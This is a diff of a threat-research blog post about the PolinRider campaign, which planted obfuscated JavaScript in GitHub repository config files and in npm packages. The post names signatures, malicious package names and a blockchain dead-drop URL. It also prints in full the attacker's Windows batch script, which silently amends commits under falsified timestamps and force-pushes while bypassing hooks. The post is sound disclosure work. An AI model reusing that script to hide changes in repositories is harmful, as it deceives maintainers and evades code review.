@@ -7,9 +7,9 @@
 
 ---
 
-The [OpenSourceMalware](https://opensourcemalware.com) team has uncovered a massive threat campaign that is implanting malware in GitHub users and organizations repositories using stolen credentials.  The threat actor, PolinRider, has implanted a malicious obfuscated JavaScript payloads in **hundreds public GitHub repositories** belonging to **hundreds unique owners**. Use the [#polinrider](https://opensourcemalware.com/?search=%23polinrider) to see all threat reports related to this campaign, and [jump to the end](#compromised-repositories) of this blog for the list of compromised repositories, including ones we recommend prioritising for immediation action. Keep in mind that the tag is the best way to get current data.
+The [OpenSourceMalware](https://opensourcemalware.com) team has uncovered a massive threat campaign that is implanting malware in GitHub users and organizations repositories.  The threat actor, PolinRider, has implanted a malicious obfuscated JavaScript payloads in **hundreds public GitHub repositories** belonging to **hundreds unique owners**. Use the [#polinrider](https://opensourcemalware.com/?search=%23polinrider) to see all threat reports related to this campaign, and [jump to the end](#compromised-repositories) of this blog for the list of compromised repositories, including ones we recommend prioritising for immediation action. Keep in mind that the tag is the best way to get current data.
 
-The JavaScript payload is appended to the end of real project config files — silently, after the file's legitimate content — making it easy to miss during casual code review. The primary infection vector appears to be a compromised npm package that executes during install or build and injects itself into config files in the project root.  Even worse, this threat actor has used the same technique to craft malicious NPM packages as well. 
+The JavaScript payload is appended to the end of real project config files — silently, after the file's legitimate content — making it easy to miss during casual code review. The primary infection vector appears to be a compromised npm package that executes during install or build and injects itself into config files in the project root.  Even worse, this threat actor has used the same technique to craft malicious NPM packages as well.
 
 This attack has been enormously successful, with one compromised open source project, Neutralinojs spreading the malware to hundreds of its users and contributors.  Neutralinojs is a very popular project with 8400 stars, 495 forks, and dozens of active contributors.  This is the power of this type of attack, as the threat isn't limited to just the initial GitHub repositories, but extends to all the other projects that use that open source.
 
@@ -29,6 +29,108 @@ This campaign is growing quickly, with the total number of compromised repositor
 
 ---
 
+## GitHub Attack Details
+
+The threat actor is not using stolen GitHub credentials. Instead, the vicims have been compromised via a malicious VS Code extension or NPM package. We don't know yet what that initial vector is, but we know what it does from the forensic evidence.
+
+The first thing that happens is the malware executes a search function on the local computer that looks for certain files like:
+
+- postcss.config.mjs
+- tailwind.config.js
+- eslint.config.mjs
+- next.config.mjs
+- babel.config.js
+- App.js
+- app.js
+
+If it finds one of those files it will append heavily obfuscated malicious JavaScript code to the end of that file.  Next, the malware installs a Windows batch file, named temp_auto_push.bat.  We know this file exists and what it does because the threat actors have left it on hundreds of compromised servers which gives researchers a fingerprint to search for.  Here's the batch file in its entirety:
+
+```
+@echo off
+for /f "delims=" %%A in ('cmd /c "git log -1 --date=format-local:%%Y-%%m-%%d --format=%%cd"') do set LAST_COMMIT_DATE=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --date=format-local:%%H:%%M:%%S --format=%%cd"') do set LAST_COMMIT_TIME=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%s"') do set LAST_COMMIT_TEXT=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%an"') do set USER_NAME=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%ae"') do set USER_EMAIL=%%A
+for /f "delims=" %%A in ('git rev-parse --abbrev-ref HEAD') do set CURRENT_BRANCH=%%A
+echo %LAST_COMMIT_DATE% %LAST_COMMIT_TIME%
+echo %LAST_COMMIT_TEXT%
+echo %USER_NAME% (%USER_EMAIL%)
+echo Branch: %CURRENT_BRANCH%
+set CURRENT_DATE=%date%
+set CURRENT_TIME=%time%
+date %LAST_COMMIT_DATE%
+time %LAST_COMMIT_TIME%
+echo Date temporarily changed to %LAST_COMMIT_DATE% %LAST_COMMIT_TIME%
+git config --local user.name %USER_NAME%
+git config --local user.email %USER_EMAIL%
+git add .
+git commit --amend -m "%LAST_COMMIT_TEXT%" --no-verify
+date %CURRENT_DATE%
+time %CURRENT_TIME%
+echo Date restored to %CURRENT_DATE% %CURRENT_TIME% and complete amend last commit!
+git push -uf origin %CURRENT_BRANCH% --no-verify
+@echo on
+```
+
+### Batch File Analysis
+
+This batch file **rewrites the most recent git commit while preserving its original timestamp** — effectively making an amended commit look like it was never touched.
+
+#### Phase 1: Extract Last Commit Metadata
+
+It runs `git log -1` five times to pull the last commit's details into environment variables:
+
+| Variable | Value captured |
+|---|---|
+| `LAST_COMMIT_DATE` | Date of last commit (YYYY-MM-DD) |
+| `LAST_COMMIT_TIME` | Time of last commit (HH:MM:SS) |
+| `LAST_COMMIT_TEXT` | Commit message |
+| `USER_NAME` | Author name |
+| `USER_EMAIL` | Author email |
+| `CURRENT_BRANCH` | Current branch name |
+
+#### Phase 2: Display Extracted Info
+
+Echoes those values to the console so you can see what was captured before proceeding.
+
+#### Phase 3: The Timestamp Trick (Core Manipulation)
+
+1. Saves the *current* system date and time to variables
+2. **Changes the Windows system clock** to match the last commit's date and time
+3. Sets the local git `user.name` and `user.email` to match the original commit's author
+
+#### Phase 4: Amend the Commit
+
+```bat
+git add .
+git commit --amend -m "%LAST_COMMIT_TEXT%" --no-verify
+```
+
+Because the system clock was rewound, git records the amended commit with the **original timestamp**, making it appear unmodified in history. `--no-verify` bypasses any pre-commit hooks.
+
+#### Phase 5: Restore and Push
+
+1. Restores the system clock to the real current date/time
+2. Force-pushes to the remote branch with `-uf` and `--no-verify` to bypass push hooks
+
+#### In Plain Terms
+
+This script lets you silently modify the last commit (adding or changing files) while making the rewritten commit appear to have the same author, timestamp, and message as before. To any observer looking at git history, it looks like the commit was never amended.
+
+#### Notable Characteristics
+
+- **Requires elevated privileges** to change the Windows system clock
+- **Force push** (`-uf`) will overwrite remote history — destructive to anyone else on the branch
+- Both `--no-verify` flags intentionally bypass any CI/CD hooks or lint checks
+- It is essentially a **history-falsification tool** — useful for legitimate cleanup, but equally useful for covering tracks
+
+### What about Linux and MacOS?
+
+We assume the malware has similar functions to rewrite git history for other operating systems like Linux and MacOS.  In fact, we've seen evidence its happening on other OSes, but the threat actors have not left tools that work on those other platforms in the source code like they have for Windows.
+
+---
+
 ## Recommended Actions
 
 **For affected repo owners:**
@@ -45,7 +147,43 @@ This campaign is growing quickly, with the total number of compromised repositor
 
 ### Check for PolinRider with OSM script
 
-Our team has written a bash script that will check your local system for compromise.  At the end of this blog post you can find out more.
+Our team has written a bash script that will check your local system for compromise.  At the end of this blog post you can find out more, or you can checkout the script [here](https://github.com/OpenSourceMalware/PolinRider/blob/main/polinrider-scanner.sh)
+
+---
+
+
+## Infected File Types
+
+| File | Occurrences |
+|------|------------:|
+| `postcss.config.mjs` | 416 |
+| `tailwind.config.js` | 84 |
+| `eslint.config.mjs` | 60 |
+| `postcss.config.js` | 13 |
+| `App.js` | 13 |
+| `next.config.mjs` | 12 |
+| `index.js` | 6 |
+| `astro.config.mjs` | 6 |
+| `tailwind.config.mjs` | 5 |
+
+The dominance of `postcss.config.mjs` (416 of 675 repos, ~62%) strongly points to a compromised PostCSS or Tailwind CSS-adjacent npm package as the primary infection vector.
+
+---
+
+## Malicious NPM Packages
+
+![tailwind-mainanimation NPM Package](images/PolinRider-campaign-npm-readme.png)
+
+The threat actor has published two NPM packages:
+
+- tailwind-mainanimation which was published by the "allavin" NPM user, and is still live
+- tailwind-autoanimation which was published by the blackedward NPM user, that has been removed from the NPM registry.  
+
+![NPM Packages](images/PolinRider-campaign-npm-author.png)
+
+The tailwind-autoanimation package uses the same exact technique of appending the malicious JavaScript payload onto the end of the entrypoint file src/index.js:
+
+![NPM Payload](images/PolinRider-campaign-npm-malicious-code.png)
 
 ---
 
@@ -84,41 +222,6 @@ This final payload is a sophisticated **blockchain-based dead drop resolver** th
 
 ---
 
-## Infected File Types
-
-| File | Occurrences |
-|------|------------:|
-| `postcss.config.mjs` | 416 |
-| `tailwind.config.js` | 84 |
-| `eslint.config.mjs` | 60 |
-| `postcss.config.js` | 13 |
-| `App.js` | 13 |
-| `next.config.mjs` | 12 |
-| `index.js` | 6 |
-| `astro.config.mjs` | 6 |
-| `tailwind.config.mjs` | 5 |
-
-The dominance of `postcss.config.mjs` (416 of 675 repos, ~62%) strongly points to a compromised PostCSS or Tailwind CSS-adjacent npm package as the primary infection vector.
-
----
-
-## Malicious NPM Packages
-
-![tailwind-mainanimation NPM Package](images/PolinRider-campaign-npm-readme.png)
-
-The threat actor has published two NPM packages:
-
-- tailwind-mainanimation which was published by the "allavin" NPM user, and is still live
-- tailwind-autoanimation which was published by the blackedward NPM user, that has been removed from the NPM registry.  
-
-![NPM Packages](images/PolinRider-campaign-npm-author.png)
-
-The tailwind-autoanimation package uses the same exact technique of appending the malicious JavaScript payload onto the end of the entrypoint file src/index.js:
-
-![NPM Payload](images/PolinRider-campaign-npm-malicious-code.png)
-
----
-
 ## Malware Technical Analysis
 
 The OSM team described the complete attack chain for this malware in our [blog](https://opensourcemalware.com/blog/neutralinojs-compromise) on the recent Neutralinojs compromise.
@@ -146,7 +249,7 @@ The malware uses four layers of obfuscation:
 ### Execution Flow
 
 ```
-1. Malware loads when NPM package is imported
+1. Malware loads when NPM package is imported or the source code is run by Node
 2. Deobfuscates internal strings and function names
 3. Queries TRON blockchain account for latest transaction
    ├─ URL: https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions
@@ -1030,7 +1133,7 @@ The full CSVs are sorted by impact for triage.
 
 ## Check for infections with polinrider-scanner.sh script
 
-**What does the polinrider-scanner.sh script do?**
+**What does the polinrider-scanner.sh script do?** - This bash script looks for two main signatures, `("rmcej%otb%",2857687)`, and `global['!']='8-270-2';var _$_1e42=` and it works on Windows, Linux or MacOS. If no infections are found, the script will exit with a `0`.  If infections *are* found, the script will highlight those to you and exit with a `1`.
 
 | Artifact | Description |
 |---|---|
@@ -1039,25 +1142,6 @@ The full CSVs are sorted by impact for triage.
 | `config.bat` | Hidden orchestrator script |
 | `.gitignore` injection | `config.bat` entry added to hide the orchestrator |
 | Git reflog anomalies | Amended commits consistent with PolinRider behavior (flagged only alongside other findings) |
-
-### Signatures
-
-- **Primary**: `("rmcej%otb%",2857687)`
-- **Secondary**: `global['!']='8-270-2';var _$_1e42=`
-
-## Exit Codes
-
-| Code | Meaning |
-|---|---|
-| `0` | No infections found |
-| `1` | Infections found |
-| `2` | Error (invalid path, etc.) |
-
-## Platform Support
-
-- macOS (bash 3.2+)
-- Linux
-- Windows (Git Bash / WSL)
 
 ## Remediation
 
@@ -1076,9 +1160,12 @@ If infections are found:
 
 - GitHub Code Search: https://github.com/search?q=rmcej%25otb%25&ref=opensearch&type=code
 - OpenSourceMalware.com: https://opensourcemalware.com
+- Near miss for Qwen CLI VSCode extension:
+   - https://github.com/QwenLM/qwen-code/pull/1257
+   - https://github.com/dletterio1/qwen-code/blob/7af8f530f537ec4fae33afb4abb63f9111594229/packages/vscode-ide-companion/tailwind.config.js#L63
+- Near miss for Prizma-Zod Generator:
+   - https://github.com/finom/prisma-zod-generator/commit/05e169512fdfb8f3492f0a259b445b2d0d629cba
 
 ---
-
-**Query:** [`rmcej%otb%` on GitHub Code Search](https://github.com/search?q=rmcej%25otb%25&ref=opensearch&type=code)
 
 *Research conducted using the GitHub Code Search API. Data collected 2026-03-07.*
